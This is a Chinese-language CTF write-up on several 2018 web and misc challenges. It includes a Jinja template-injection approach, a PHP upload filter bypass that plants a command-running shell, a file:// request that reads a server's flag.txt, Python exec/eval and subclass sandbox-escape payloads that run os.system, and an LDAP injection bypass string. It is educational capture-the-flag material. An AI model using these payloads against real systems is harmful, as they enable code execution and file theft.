<h1 id="Web-Book"><a href="#Web-Book" class="headerlink" title="Web Book"></a>Web Book</h1><p>link to Web_BooK:<a href="http://34.216.132.109:8083/fp/" target="_blank" rel="noopener">http://34.216.132.109:8083/fp/</a></p>
<p>只能不停点击next，用脚本模拟</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://34.216.132.109:8083'</span></span><br><span class="line">get = <span class="string">'/fp/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = s.get(url+get)</span><br><span class="line">    h = r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> h:</span><br><span class="line">        <span class="keyword">print</span> h</span><br><span class="line">        exit</span><br><span class="line">    get = re.findall(<span class="string">'&lt;form action="(.*?)" method="get"&gt;'</span>,h)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] try '</span>+get</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<p><img src="https://i.loli.net/2018/09/04/5b8e2f61b0d14.png" alt="ks2.png"></p>
<h1 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h1><p>题目给出源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>flag是一个特定的配置值，/shrine/后面存在模版注入，过滤了<code>（）</code>，添加了黑名单，无法通过来读取配置值，也不能用获取对象的属性值</p>
<p>然后通过拜读wp知道，为了获得配置信息，需要从它的上全局变量(current_app等)访问config。</p>
<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]</span><br><span class="line"></span><br><span class="line">top.app.config[&apos;FLAG&apos;]</span><br></pre></td></tr></table></figure></p>
<p>所有的函数都会有一个<strong>globals</strong>属性,它会以一个dict，返回函数所在模块命名空间中的所有变量</p>
<p>一些方法：</p>
<ol>
<li>url_for函数</li>
</ol>
<p><code></code>找到<code>current_app</code></p>
<p>读取flag<code></code></p>
<ol start="2">
<li>get_flashed_messages函数</li>
</ol>
<p><code></code>找到<code>current_app</code></p>
<p>读取flag<code></code></p>
<ol start="3">
<li>request</li>
</ol>
<p><code></code></p>
<p>noxCTF</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>What is your reference again?</p>
<p><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p>
<p>页面显示where the <em>**</em> did you come from?，根据题意要添加Referer头</p>
<p>根据index.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">"check_from_google"</span>,</span><br><span class="line">        data: <span class="literal">NaN</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#status"</span>).html(<span class="string">"hello old friend! "</span> + atob(result))        </span><br><span class="line">        &#125;,</span><br><span class="line">        dataType: <span class="literal">NaN</span></span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#status"</span>).html(<span class="string">"where the **** did you come from?"</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/09/07/5b922f41c605f.png" alt="ks3.png"></p>
<p>应该在<code>http://chal.noxale.com:5000/check_from_google</code>判断是否来自google</p>
<p><code>curl -H &quot;Referer: https://www.google.com/&quot; http://chal.noxale.com:5000/check_from_google</code></p>
<p>得到base64，解码得到flag</p>
<p><code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p>
<h1 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h1><p>This is my new file uploader server. I bet you can’t hack it!</p>
<p><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p>
<p>开始是文件上传，抓包</p>
<p>发现总会删除最后的<code>.php</code>,且必须包含<code>.jpg</code>等图片后缀，于是用<code>.jpg.php.php</code>成功上传</p>
<p><img src="https://i.loli.net/2018/09/07/5b9244520037e.png" alt="ks5.png"></p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;My file uploading website!&lt;/title&gt;</span><br><span class="line">      &lt;meta name = <span class="string">"viewport"</span> content = <span class="string">"width = device-width, initial-scale = 1"</span>&gt;      </span><br><span class="line">      &lt;link rel = <span class="string">"stylesheet"</span></span><br><span class="line">         href = <span class="string">"https://fonts.googleapis.com/icon?family=Material+Icons"</span>&gt;</span><br><span class="line">      &lt;link rel = <span class="string">"stylesheet"</span></span><br><span class="line">         href = <span class="string">"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.3/css/materialize.min.css"</span>&gt;</span><br><span class="line">      &lt;script type = <span class="string">"text/javascript"</span></span><br><span class="line">         src = <span class="string">"https://code.jquery.com/jquery-2.1.1.min.js"</span>&gt;&lt;/script&gt;           </span><br><span class="line">      &lt;script src = <span class="string">"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.3/js/materialize.min.js"</span>&gt;</span><br><span class="line">      &lt;/script&gt; </span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;body class = "container"&gt;  </span><br><span class="line">    &lt;h5&gt; It is the most secure uploading server in the world! &lt;br&gt;&lt;/h5&gt; </span><br><span class="line">      &lt;div class = "row"&gt;</span><br><span class="line">         &lt;form enctype="multipart/form-data" class = "col s6 push-s3" method="POST" action=''&gt;</span><br><span class="line">            &lt;div class = "row"&gt;</span><br><span class="line">               &lt;div class = "file-field input-field"&gt;</span><br><span class="line">                  &lt;div class = "btn"&gt;</span><br><span class="line">                     &lt;span&gt;Browse&lt;/span&gt;</span><br><span class="line">                     &lt;input type = <span class="string">"file"</span> name=<span class="string">"upload"</span>/&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;div class = "file-path-wrapper"&gt;</span><br><span class="line">                     &lt;input class = "file-path validate" type = "text"</span><br><span class="line">                        placeholder = <span class="string">"Upload file"</span> /&gt;</span><br><span class="line"></span><br><span class="line">                  &lt;button class="btn waves-effect waves-light" type="submit" name="action"&gt;Submit</span><br><span class="line">                    &lt;i class="material-icons right"&gt;send&lt;/i&gt;</span><br><span class="line">                  &lt;/button&gt;</span><br><span class="line">        </span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                  &lt;p style="text-align:center" class="col push-s3"&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>($_FILES[<span class="string">"upload"</span>][<span class="string">"error"</span>] != <span class="number">0</span>) <span class="keyword">die</span>(<span class="string">"Problem occured with file upload"</span>);</span><br><span class="line">                      $target_path = <span class="string">"uploads"</span>;</span><br><span class="line">                      $file_name = $_FILES[<span class="string">"upload"</span>][<span class="string">'name'</span>];</span><br><span class="line">                      $file_type = $_FILES[<span class="string">"upload"</span>][<span class="string">'type'</span>];</span><br><span class="line">                      $file_name = preg_replace(<span class="string">"/(\.php$|\.html$)/i"</span>, <span class="string">""</span>, $file_name);</span><br><span class="line">                      </span><br><span class="line">                      <span class="keyword">echo</span> <span class="string">"File: "</span> . $file_name . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                      <span class="keyword">if</span>(preg_match(<span class="string">"/(.jpg|.png|.gif)/i"</span>, $file_name))</span><br><span class="line">                      &#123;</span><br><span class="line">                        move_uploaded_file($_FILES[<span class="string">'upload'</span>][<span class="string">'tmp_name'</span>], <span class="string">"&#123;$target_path&#125;/&#123;$file_name&#125;"</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"Image uploaded to: &lt;a href='&#123;$target_path&#125;/&#123;$file_name&#125;'&gt;Here&lt;/a&gt; &lt;br&gt;"</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"There is no .png/.jpg/.gif in that file name"</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                  &lt;/p&gt;</span><br><span class="line">               &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">         &lt;/form&gt;       </span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">   &lt;/body&gt;   </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>不过菜刀连接返回500，直接传一个执行命令的php，却怎么也找不到flag在哪，uploads目录下可能含flag的文件，7H3-FL4G-1S-H3r3，flag.txt等无权限访问，应该是做了权限处理</p>
<p><code>../.htaccess</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Options +Indexes</span><br><span class="line">AddType application/x-httpd-php .cyb3r</span><br><span class="line"></span><br><span class="line">&lt;files flag.txt&gt;</span><br><span class="line">	order allow,deny</span><br><span class="line">	deny from allow</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;Dockerfile&quot;&gt;</span><br><span class="line">	Order deny,allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;apache2.conf&quot;&gt;</span><br><span class="line">	Order deny,allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;.htaccess&quot;&gt;</span><br><span class="line">	Order deny,allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line"></span><br><span class="line">IndexIgnore *php *pht *txt *png *jpg *gif *cyb3r *php* *Cyb3r</span><br></pre></td></tr></table></figure>
<p>然后不知道怎么办了，在uploads下弄了个.htaccess，然后访问uploads就Internal Server Error，可能被我弄坏了吧</p>
<p>过了几个小时又好了，应该是管理员重置了题目，这次uploads下文件较少，flag应该就在7H3-FL4G-1S-H3r3里，但仍don’t have permission to access /uploads/7H3-FL4G-1S-H3r3</p>
<p>最后ls -l查看权限时出了flag</p>
<p><img src="https://i.loli.net/2018/09/07/5b92707d227bf.png" alt="ks6.png"></p>
<h1 id="Marcode"><a href="#Marcode" class="headerlink" title="Marcode"></a>Marcode</h1><p>Marcode (Mr. Code in Hebrew), Ineed your help!<br>I got a movie but I cant see it. It hypnotizes me.<br>please help me!<br>yours,<br>Gveretcode (Mrs. Code in Hebrew)</p>
<p>P.S.<br>change NOXCTF to noxCTF.<br><a href="https://drive.google.com/open?id=1GkalBntU1s6d_sw_S5I4GinD8hBrh-C-" target="_blank" rel="noopener">https://drive.google.com/open?id=1GkalBntU1s6d_sw_S5I4GinD8hBrh-C-</a></p>
<p>这是个很有意思的题</p>
<p>先通过url下载得到一个mp4，打开后不断切换着二维码，根本没法扫</p>
<p><img src="https://i.loli.net/2018/09/08/5b9377c622c39.png" alt="ks7.png"></p>
<p>长达两分多钟，得用脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 </span><br><span class="line"></span><br><span class="line">videoCapture = cv2.VideoCapture()</span><br><span class="line">videoCapture.open(<span class="string">'/Users/xc/Downloads/Marcode.mp4'</span>)</span><br><span class="line"></span><br><span class="line">fps = videoCapture.get(cv2.CAP_PROP_FPS)</span><br><span class="line">frames = videoCapture.get(cv2.CAP_PROP_FRAME_COUNT)</span><br><span class="line"><span class="comment">#fps是帧率，意思是每一秒刷新图片的数量，frames是一整段视频中总的图片数量。</span></span><br><span class="line">print(<span class="string">"fps="</span>,fps,<span class="string">"frames="</span>,frames)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(frames)):</span><br><span class="line">    ret,frame = videoCapture.read()</span><br><span class="line">    cv2.imwrite(<span class="string">"./Marcode-jpg/mp4-(%d).jpg"</span>%i,frame)</span><br></pre></td></tr></table></figure>
<p>把视频中的每一帧都存为jpg，跑完得到3490个jpg，每一个二维码扫完都会得到一个google云盘url，访问能看到仅含一个字符的小图片</p>
<p>再用脚本把每一个jpg都扫一遍，大部分url是重复的，最终得到28个不同的url</p>
<p><img src="https://i.loli.net/2018/09/08/5b9379e6616d8.png" alt="ks8.png"></p>
<p>等于每个url表示一个字符，又用脚本做了url对应字符的字典，再跑一遍jpg得到一篇文章，是Harry Potter的Chapter 1 The Dark Lord Ascending</p>
<p>搜原文，处理下再burp compare，应该就能得到flag了</p>
<p><img src="https://i.loli.net/2018/09/08/5b937bae4be39.png" alt="ks9.png"></p>
<p>弄什么harry potter，原文都不一样，眼都看瞎了,最终找不同得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n o x ctf a into-with v impaosing-impressive d a was-were k e d a toward-towards inward-inwards v wall-walls r  upward -upwards a</span><br></pre></td></tr></table></figure>
<p>不知flag到底怎么写，比赛结束看到wp，flag竟是<code>noxCTF{AVADAKEDAVRA}</code></p>
<p>扫描的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line">urllist = []</span><br><span class="line">picdict = &#123;&#125;</span><br><span class="line">pdic = &#123;<span class="string">'https://drive.google.com/open?id=131OPuwNVggs0ZAsVie4dfA3k9zLWN-uu'</span>: <span class="string">'T'</span>, <span class="string">'https://drive.google.com/open?id=1c-go7QIZb_yqGDsRKlXG1j1Py7-wcSFG'</span>: <span class="string">'H'</span>, <span class="string">'https://drive.google.com/open?id=1upmw0QvLjzp6b7RjCrjJGjYfRijF82-g'</span>: <span class="string">'E'</span>, <span class="string">'https://drive.google.com/open?id=1vHlCNodJ84iw51C8gIz4hr0UpsWNx3fm'</span>: <span class="string">'_'</span>, <span class="string">'https://drive.google.com/open?id=1mZivmNZ8uDiUb5YUoF8sj9kZXKkh7GNO'</span>: <span class="string">'W'</span>, <span class="string">'https://drive.google.com/open?id=1pXSHKhMzuKrUMg0x8ygZ36yTn0-9nBe8'</span>: <span class="string">'O'</span>, <span class="string">'https://drive.google.com/open?id=1b5wz-LsIBxnA7mp5ImbNLZQY0nob94OO'</span>: <span class="string">'M'</span>, <span class="string">'https://drive.google.com/open?id=1cZlhiRoZcEiaNEwScBQd0IA2PXh1Z1tX'</span>: <span class="string">'N'</span>, <span class="string">'https://drive.google.com/open?id=1OqacmR-Ccc2YLVYCS2co4dWtSqfEGxIl'</span>: <span class="string">'A'</span>, <span class="string">'https://drive.google.com/open?id=1DF2RneUWAb6wqp7YJ0vjOwDJGdENEc0Q'</span>: <span class="string">'P'</span>, <span class="string">'https://drive.google.com/open?id=1lKeCjQFcTSuUzMGUEeEzPj4d2x1MLTJm'</span>: <span class="string">'R'</span>, <span class="string">'https://drive.google.com/open?id=1JtDxAfX8AEC_mFzJPZofI1RyOL62MAmk'</span>: <span class="string">'D'</span>, <span class="string">'https://drive.google.com/open?id=1hjIQq2fEcduFF0CfRs-MJ2hlCuC5lkW6'</span>: <span class="string">'U'</span>, <span class="string">'https://drive.google.com/open?id=1rHGDe2F5vLws9fA0M3L9IELX9LYaU50x'</span>: <span class="string">'F'</span>, <span class="string">'https://drive.google.com/open?id=1p4m9gtvh31s2SJ9G1uNr8burIvQabm_k'</span>: <span class="string">'?'</span>, <span class="string">'https://drive.google.com/open?id=1g2I1a09lO4m0imhIzJ60LUeDPNDIdIp_'</span>: <span class="string">'Y'</span>, <span class="string">'https://drive.google.com/open?id=1lSanpoEq3LeV0aaL6KEnUiJE2iGijdrt'</span>: <span class="string">'S'</span>, <span class="string">'https://drive.google.com/open?id=1Rw-Op049iTliLPFTTRj7p4gBXmm8IboN'</span>: <span class="string">'I'</span>, <span class="string">'https://drive.google.com/open?id=1H5DHyv0METKfLV7xdzw-SVXU_F1o1iKM'</span>: <span class="string">'L'</span>, <span class="string">'https://drive.google.com/open?id=1GLtL-X1IS4ms6fwC2OQV4jAmXjI_6bjQ'</span>: <span class="string">'C'</span>, <span class="string">'https://drive.google.com/open?id=1vPBtiNzUzYEOEKFK60vG305uPw9CDy8p'</span>: <span class="string">'Q'</span>, <span class="string">'https://drive.google.com/open?id=1DV0ACuyKWsFm2ApXgHHDP_DSzwqmtt5M'</span>: <span class="string">'G'</span>, <span class="string">'https://drive.google.com/open?id=1nlp-HIwnRbG61mf5SF_BzMdlNAR7tHLt'</span>: <span class="string">'Z'</span>, <span class="string">'https://drive.google.com/open?id=151y0xa6hnTR9yp9G0D-dyox08bV4-JZX'</span>: <span class="string">'B'</span>, <span class="string">'https://drive.google.com/open?id=1dtYor_A9Sf3DDTlczTLA0s9rBluVNoOX'</span>: <span class="string">'K'</span>, <span class="string">'https://drive.google.com/open?id=1UpU1_MTK-0XgCpcZKC4AVGsBswNpQTBO'</span>: <span class="string">'X'</span>, <span class="string">'https://drive.google.com/open?id=1apKMrqUwZn5dOkRWfjbYgYH_RvkmPD2P'</span>: <span class="string">'V'</span>, <span class="string">'https://drive.google.com/open?id=1uynnoN7ItBRls7MiqFa1rLE-W3o9CnY5'</span>: <span class="string">'J'</span>&#125;</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">code = []</span><br><span class="line">codes = <span class="string">"THE_WOMNAPRDUF?YSILCQGZBKXVJ"</span></span><br><span class="line">string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ac <span class="keyword">in</span> codes:</span><br><span class="line">    code.append(ac)</span><br><span class="line"><span class="string">'''print (code)'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3490</span>):</span><br><span class="line">    name = <span class="string">"mp4-("</span>+str(i)+<span class="string">").jpg"</span></span><br><span class="line">    decode_result = decode(Image.open(name))</span><br><span class="line">    url = str(decode_result[<span class="number">0</span>].data, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    string = string + pdic[url]</span><br><span class="line">    <span class="keyword">print</span> (string)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if url not in urllist:</span></span><br><span class="line"><span class="string">        picdict[url] = code[sum]</span></span><br><span class="line"><span class="string">        sum = sum + 1    </span></span><br><span class="line"><span class="string">        urllist.append(url)</span></span><br><span class="line"><span class="string">        #print ('[+] '+name+' :'+url)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"><span class="comment">#print ("totla is "+str(sum))</span></span><br><span class="line"><span class="comment">#print (picdict)</span></span><br><span class="line"><span class="keyword">print</span> (string)</span><br></pre></td></tr></table></figure>
<p>以下是看wp后的记录</p>
<h1 id="hiddenDOM"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</h1><p>I decided to create a tool that searches for<br>hidden elements inside a web pages.<br>Few days ago someone told me that my website is not so /secure/…<br>Can you check it yourself ?</p>
<p><a href="http://13.59.2.198:5588" target="_blank" rel="noopener">http://13.59.2.198:5588</a></p>
<p>解码之后的一段js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var _0x2b80 = [&quot;slow&quot;, &quot;fadeOut&quot;, &quot;#hidden_elements&quot;, &quot;click&quot;, &quot;#hideArea&quot;, &quot;ready&quot;, &quot;fadeIn&quot;, &quot;#showArea&quot;];</span><br><span class="line">$(document)[_0x2b80[5]](function() &#123;</span><br><span class="line">  $(_0x2b80[4])[_0x2b80[3]](function() &#123;</span><br><span class="line">    $(_0x2b80[2])[_0x2b80[1]](_0x2b80[0]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">$(document)[_0x2b80[5]](function() &#123;</span><br><span class="line">  $(_0x2b80[7])[_0x2b80[3]](function() &#123;</span><br><span class="line">    $(_0x2b80[2])[_0x2b80[6]](_0x2b80[0]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>起作用就是创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;main_form&quot; action=&quot;index.php&quot; style=&quot;position:sticky;&quot;&gt;</span><br><span class="line">&lt;input name=&quot;expression&quot; placeholder=&quot;/&lt;[^&lt;&gt;]&#123;1,&#125;hidden[^&lt;&gt;]&#123;1,&#125;&gt;/&quot; type=&quot;text&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>相比之前还要输入一个expression</p>
<p>输入源码里<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden &gt;-_-&lt;/a&gt;&lt;p style=&#39;color:red;&#39;&gt;&lt;/p&gt;</code>中的路径后得到另一段js,不过没用</p>
<p>满足expression的正则，file读取文件</p>
<p><code>?target=file:///var/www/html/flag.txt&amp;expression=/.*/</code></p>
<h1 id="Python-for-fun-Misc"><a href="#Python-for-fun-Misc" class="headerlink" title="Python for fun - Misc"></a>Python for fun - Misc</h1><p><a href="http://chal.noxale.com:8000/" target="_blank" rel="noopener">http://chal.noxale.com:8000/</a></p>
<p>传递两个被解释的参数进行注入</p>
<p><img src="https://i.loli.net/2018/09/09/5b950e343dbf2.png" alt="ks10.png"></p>
<p><code>a,b=print(exec(&quot;import os&quot;),eval(&quot;os.listdir(&#39;.&#39;)&quot;))</code></p>
<p><code>a,b=print(open(&quot;FLAG&quot;, &quot;r&quot;).read())</code></p>
<h3 id="Python-for-fun-2"><a href="#Python-for-fun-2" class="headerlink" title="Python for fun 2"></a>Python for fun 2</h3><p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;cat FLAG&quot;)</code></p>
<h3 id="LDAP-injection"><a href="#LDAP-injection" class="headerlink" title="LDAP injection"></a>LDAP injection</h3><p><a href="http://web.chal.csaw.io:8080/index.php?search=" target="_blank" rel="noopener">http://web.chal.csaw.io:8080/index.php?search=</a></p>
<blockquote>
<p>LDAP注入是一种攻击，用于利用基于web的应用程序，这些应用程序基于用户输入构建LDAP语句。当应用程序无法正确清理用户输入时，可以使用本地代理修改LDAP语句。这可能会导致执行任意命令，例如授予未授权查询的权限，以及在LDAP树内修改内容。SQL注入中可用的相同高级开发技术可以类似地应用于LDAP注入中。</p>
</blockquote>
<p>服务查询类似：<br><code>(&amp;(GivenName=&lt;INPUT&gt;)(!(GivenName=Flag)))</code></p>
<p>利用<code>*)(uid=*))(|(uid=*</code>绕过</p>
<p>完整语句：<br><code>(&amp;(GivenName=*)(uid=*))(|(uid=*)(!(GivenName=Flag)))</code></p>
